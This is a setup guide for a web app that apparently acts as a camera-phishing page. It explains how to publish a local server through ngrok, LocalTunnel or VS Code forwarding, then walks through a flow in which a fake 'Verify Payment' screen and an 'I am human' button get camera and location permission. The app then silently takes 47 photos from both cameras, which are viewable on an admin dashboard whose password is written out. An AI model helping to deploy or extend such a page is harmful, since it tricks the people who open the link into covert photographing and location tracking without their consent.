# 🌐 Port Forwarding Guide - Test Dual-Camera System on Mobile

## 📱 Quick Setup (3 Methods)

Your server is running on: **http://localhost:3003**

---

## ✅ METHOD 1: VS Code Port Forwarding (EASIEST)

If you're using VS Code:

1. **Open the Ports Panel**
   - Press `Ctrl + ~` to open terminal
   - Click on **"PORTS"** tab (next to TERMINAL)
   
2. **Forward Port 3003**
   - Click **"Forward a Port"**
   - Enter: `3003`
   - Press Enter

3. **Get Public URL**
   - Right-click on port 3003
   - Select **"Port Visibility" → "Public"**
   - Right-click again → **"Copy Forwarded Address"**

4. **Open on Mobile**
   - Paste the URL in your mobile browser
   - It will look like: `https://xxxx-xxxx-xxxx.github.dev`

---

## ✅ METHOD 2: ngrok (Professional, HTTPS)

### Install ngrok:
1. Download: https://ngrok.com/download
2. Extract to any folder
3. Open PowerShell in that folder

### Run:
```powershell
.\ngrok.exe http 3003
```

### Get URL:
- You'll see a forwarding URL like:
  ```
  Forwarding: https://xxxx-xxxx-xxxx.ngrok-free.app -> http://localhost:3003
  ```
- Open that URL on your mobile device!

---

## ✅ METHOD 3: LocalTunnel (NPM, Quick)

### Run this command:
```powershell
npx localtunnel --port 3003
```

### Get URL:
- You'll see: `your url is: https://xxxxx.loca.lt`
- Open that URL on your mobile
- **First time**: You'll see a page asking for the tunnel password
- Click "Click to Continue" or enter the IP shown

---

## ✅ METHOD 4: Same WiFi Network (Local Only)

If your mobile is on the **same WiFi** as your PC:

1. **Find Your PC's Local IP**:
   ```powershell
   ipconfig
   ```
   - Look for "IPv4 Address" under your WiFi adapter
   - Example: `192.168.1.100`

2. **Open on Mobile**:
   - URL: `http://192.168.1.100:3003`
   - ⚠️ Note: This is HTTP (not HTTPS)
   - Camera permissions may be restricted on some browsers

---

## 🎥 Testing the Dual-Camera System

Once you have the public URL:

### Test Flow:
1. **Open URL on mobile browser** (Chrome/Safari recommended)
2. Click **"Verify Payment"**
3. Enter any payment ID (example: `PAY123ABC`)
4. Click **"Verify Payment"** button
5. Allow **Location permissions** when prompted
6. Click **"I am human"** button
7. Allow **Camera permissions** when prompted
8. **Watch the magic!** 🎉
   - Front camera: 8 photos in 400ms
   - Back camera: 7 photos in 350ms
   - Receipt page: 20 more photos (10 front + 10 back)

### What You'll See:
- ⚡ Ultra-fast capture (< 1 second)
- 📸 Both cameras activated automatically
- ✅ "Identity Confirmed" message
- 📄 Payment receipt displayed

### Total Photos Captured:
- **Login**: 12 photos (6 front + 6 back)
- **Verification**: 15 photos (8 front + 7 back)
- **Receipt**: 20 photos (10 front + 10 back)
- **TOTAL**: **47 photos** from dual cameras! 📸📸

---

## 🔧 Troubleshooting

### "Camera not working"
- ✅ Make sure you're using **HTTPS** (ngrok/localtunnel)
- ✅ Camera requires secure context on mobile
- ✅ HTTP only works on localhost

### "Back camera not capturing"
- ✅ Normal on desktop (no back camera)
- ✅ On mobile, check camera permissions
- ✅ Some browsers may block back camera - try Chrome

### "Location not working"
- ✅ Enable location services on mobile
- ✅ Allow location permission in browser
- ✅ Move near a window for better GPS

### "Site can't be reached"
- ✅ Make sure your server is still running (`npm run dev`)
- ✅ Check the port forwarding tool is still active
- ✅ Try regenerating the tunnel URL

---

## 📊 Viewing Captured Photos

1. **Access Admin Dashboard**:
   - URL: `https://your-tunnel-url/admin-login`
   - Password: `safwan@123`

2. **View Photos**:
   - Click on any transaction
   - Scroll to "Captured Photos" section
   - See all 47 photos with timestamps
   - Photos tagged with camera source (front/back)

---

## 🎯 Recommended Method

For best results testing dual-camera system:

**🏆 Use ngrok (Method 2)**
- ✅ HTTPS by default (required for camera)
- ✅ Stable connection
- ✅ Works on all networks
- ✅ Professional URL format

---

## 📝 Current Status

- ✅ Server: Running on port 3003
- ✅ Dual-camera system: Implemented
- ✅ Ultra-fast capture: 50ms intervals
- ✅ Total photos: 47 per session
- ⏳ Tunnel: Use one of the methods above

---

**Happy Testing! 🚀📸**
